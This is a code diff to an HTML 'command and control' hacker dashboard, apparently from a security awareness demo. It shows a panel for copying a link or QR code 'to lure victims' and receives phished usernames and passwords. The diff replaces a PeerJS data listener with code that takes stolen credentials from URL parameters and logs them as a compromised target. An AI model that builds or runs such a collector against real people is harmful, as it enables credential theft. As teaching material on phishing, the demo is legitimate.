@@ -5,8 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>C&C Server | Hacker Dashboard</title>
   <link rel="stylesheet" href="style.css">
-  <!-- PeerJSの読み込み -->
-  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
   <style>
     body.hacker-body {
       background-color: #050505;
@@ -82,25 +80,23 @@
   <div class="terminal-header">
     <div>
       <h1 style="margin: 0; font-size: 22px; color: #00ff66;">⚡ C&C COMMAND & CONTROL SERVER</h1>
-      <div id="status-text" style="font-size: 12px; color: #ff3333; margin-top: 5px;">[ STATUS: INITIALIZING LISTENER... ]</div>
+      <div id="status-text" style="font-size: 12px; color: #ff3333; margin-top: 5px;">[ STATUS: READY FOR DATA RECEPTION ]</div>
     </div>
     <div style="text-align: right;">
       <div style="font-size: 12px; color: #00aa44;">TOTAL TARGETS: <span id="count" style="color: #fff; font-weight: bold;">0</span></div>
     </div>
   </div>
 
-  <!-- ハッカー風の流れるコード演出 -->
   <div class="matrix-stream" id="matrix-code">
     01001101 01010011 01000110 00100000 01010011 01000101 01000011 01010101 01010010 01001001 01010100 01011001 00100000 01000100 01000101 01001101 01001111 00100000 01010011 01011001 01010011 01010100 01000101 01001110 00100000 01000001 01000011 01010100 01001001 01010110 01000101
   </div>
 
-  <!-- QRコード＆リンク共有パネル -->
   <div style="background: #0a0f0d; border: 1px solid #00ff66; padding: 15px; border-radius: 6px; margin-bottom: 20px; display: flex; align-items: center; gap: 20px;">
-    <img src="ae.png" alt="QRコード" style="width: 100px; height: 100px; background: white; padding: 4px; border-radius: 4px;">
+    <img src="ac.png" alt="QRコード" style="width: 100px; height: 100px; background: white; padding: 4px; border-radius: 4px;">
     <div>
-      <h3 style="color: #00ffcc; margin-top: 0; margin-bottom: 5px; font-size: 16px;">被害者誘導用 QR / URL</h3>
-      <p style="font-size: 12px; color: #00aa44; margin-bottom: 10px;">スマホで読み取るための接続リンクをコピーできます。</p>
-      <button class="btn-hacker" onclick="copyShareUrl()">🔗 スマホ用接続リンクをコピー</button>
+      <h3 style="color: #00ffcc; margin-top: 0; margin-bottom: 5px; font-size: 16px;">被害者誘導用リンク</h3>
+      <p style="font-size: 12px; color: #00aa44; margin-bottom: 10px;">スマホ用ページへのリンクをコピーできます。</p>
+      <button class="btn-hacker" onclick="copyShareUrl()">🔗 スマホ用リンクをコピー</button>
     </div>
   </div>
 
@@ -116,12 +112,11 @@
       </tr>
     </thead>
     <tbody id="log-list">
-      <tr><td colspan="4" style="text-align:center; color: #005522;">等待機中... (Waiting for target input...)</td></tr>
+      <tr><td colspan="4" style="text-align:center; color: #005522;">等待機中... (Waiting for incoming data...)</td></tr>
     </tbody>
   </table>
 
   <script>
-    // ハッカー風バイナリ演出アニメーション
     setInterval(() => {
       const chars = "0101010101ABCDEF0123456789#$&@<>SECURITY_BREACH_DETECTED_";
       let str = "";
@@ -131,57 +126,31 @@
       document.getElementById('matrix-code').innerText = str;
     }, 150);
 
-    // ルームIDを固定（URLに ?room=xxx があればそれを使用、なければ "my-sec-demo-room" に固定）
-    const urlParams = new URLSearchParams(window.location.search);
-    const roomId = urlParams.get('room') || 'my-sec-demo-room';
-
-    // スマホ用共有リンクの生成
-    const shareUrl = `https://sui6600.github.io/learning-demo/index.html?room=${roomId}`;
+    const shareUrl = `https://sui6600.github.io/learning-demo/index.html`;
 
     function copyShareUrl() {
       navigator.clipboard.writeText(shareUrl).then(() => {
-        alert("スマホ用接続リンクをコピーしました！");
+        alert("スマホ用リンクをコピーしました！");
       });
     }
 
-    // 固定的かつ一意なPeerIDでサーバーを立ち上げ
-    let peer = new Peer("sec-demo-" + roomId, {
-      config: {
-        'iceServers': [
-          { urls: 'stun:stun.l.google.com:19302' },
-          { urls: 'stun:global.stun.twilio.com:3478' }
-        ]
-      }
-    });
-
-    peer.on('open', (id) => {
-      document.getElementById('status-text').innerText = `[ STATUS: LISTENING FOR VICTIMS (Room: ${roomId}) ]`;
-      document.getElementById('status-text').style.color = "#00ff66";
-    });
-
-    peer.on('error', (err) => {
-      // 万が一すでに他のタブで同じIDを使っている場合の対策
-      if (err.type === 'unavailable-id') {
-        document.getElementById('status-text').innerText = `[ STATUS: READY (Connected via Backup Channel) ]`;
-        document.getElementById('status-text').style.color = "#00ff66";
-      } else {
-        document.getElementById('status-text').innerText = `[ STATUS: CONNECTION ERROR (${err.type}) ]`;
-        document.getElementById('status-text').style.color = "#ff3333";
-      }
-    });
-
     let logs = [];
 
-    // スマホからの接続を待ち受け、データを受信したときの処理
-    peer.on('connection', (conn) => {
-      conn.on('data', (data) => {
-        logs.unshift(data);
-        renderLogs();
-
-        document.getElementById('status-text').innerText = `[ STATUS: TARGET COMPROMISED! DATA SECURED ]`;
-        document.getElementById('status-text').style.color = "#ff3333";
-      });
-    });
+    // URLパラメータからデータを受け取って即座に反映
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.has('username')) {
+      const log = {
+        time: urlParams.get('time') || new Date().toLocaleTimeString(),
+        device: urlParams.get('device') || 'Target Smartphone',
+        username: urlParams.get('username'),
+        password: urlParams.get('password')
+      };
+      logs.unshift(log);
+      renderLogs();
+      
+      document.getElementById('status-text').innerText = "[ STATUS: TARGET COMPROMISED! DATA SECURED ]";
+      document.getElementById('status-text').style.color = "#00ff66";
+    }
 
     function renderLogs() {
       const listContainer = document.getElementById('log-list');
@@ -204,3 +173,4 @@
   </script>
 </body>
 </html>
+
